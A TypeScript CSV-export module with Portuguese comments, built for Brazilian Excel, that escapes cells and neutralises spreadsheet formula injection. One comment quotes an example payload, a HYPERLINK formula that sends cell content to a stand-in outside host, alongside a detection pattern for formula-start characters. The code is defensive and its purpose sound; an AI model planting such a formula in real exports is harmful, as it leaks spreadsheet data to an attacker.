/**
 * Escrita de CSV, compartilhada por quem exporta.
 *
 * Duas escolhas ditadas pelo destino real do arquivo, que é o Excel em
 * português: separador ponto-e-vírgula (com vírgula, o Excel brasileiro joga
 * a linha inteira numa célula só) e BOM UTF-8 no início (sem ele,
 * "Alimentação" chega como "AlimentaÃ§Ã£o").
 *
 * Vive em `lib/` e não junto de uma exportação específica porque agora há
 * duas: os lançamentos de quem usa e a lista de contas de quem administra.
 * Duas cópias da mesma regra de escape divergem no primeiro acento estranho
 * que alguém corrigir num lado só.
 */

/**
 * Caracteres que fazem uma planilha ler texto como fórmula.
 *
 * `=`, `+`, `-` e `@` no começo de uma célula são o início de uma expressão
 * para o Excel e para o Google Sheets, e tabulação e retorno de carro caem no
 * mesmo tratamento em algumas versões.
 */
const INICIO_DE_FORMULA = /^[=+\-@\t\r]/

/**
 * Um número escrito como este arquivo escreve números.
 *
 * Existe por causa do sinal de menos: `-45,90` começa com um caractere da
 * lista acima, mas é o valor de uma despesa — a coluna inteira de valores
 * começa assim. Marcá-la como texto faria a planilha parar de somar a coluna,
 * que é a primeira coisa que alguém faz depois de exportar. Número puro passa
 * direto; `-45,90+alguma-coisa` não é número puro e não passa.
 */
const NUMERO = /^-?\d+([.,]\d+)?$/

/**
 * Neutraliza a célula que a planilha tentaria calcular.
 *
 * As aspas do CSV **não** protegem: elas são delimitador do formato, e a
 * planilha as remove antes de olhar o conteúdo. Uma descrição de lançamento
 * como `=HYPERLINK("https://sitedele/"&A1)` — que chega pronta de um extrato
 * importado, e não da digitação de quem usa — vira fórmula ao abrir o arquivo,
 * e pode acabar mandando o conteúdo da planilha para fora. É a mesma classe de
 * problema que o `WEBSERVICE` e o `DDE` do Excel exploram há anos.
 *
 * O apóstrofo à frente é a marca de "isto é texto" que as duas planilhas
 * entendem, e ele não aparece na célula. Só as células que começariam uma
 * fórmula recebem a marca: pôr em todas encheria o arquivo de sujeira em nome
 * de um caso que a maioria das linhas não é.
 */
function neutralizarFormula(value: string): string {
  if (NUMERO.test(value)) return value
  return INICIO_DE_FORMULA.test(value) ? `'${value}` : value
}

/** Aspas duplicadas e campo entre aspas: o escape padrão do formato. */
function escapeCell(value: string): string {
  return `"${neutralizarFormula(value).replace(/"/g, '""')}"`
}

export function buildCsv(header: readonly string[], rows: readonly (readonly string[])[]): string {
  return [header, ...rows].map((row) => row.map(escapeCell).join(';')).join('\r\n')
}

export function downloadCsv(csv: string, filename: string): void {
  // O BOM vai aqui, e não em quem monta o conteúdo: é propriedade do arquivo,
  // não da tabela.
  const blob = new Blob([`﻿${csv}`], { type: 'text/csv;charset=utf-8;' })
  const url = URL.createObjectURL(blob)
  const anchor = document.createElement('a')

  anchor.href = url
  anchor.download = filename
  document.body.append(anchor)
  anchor.click()
  anchor.remove()
  URL.revokeObjectURL(url)
}
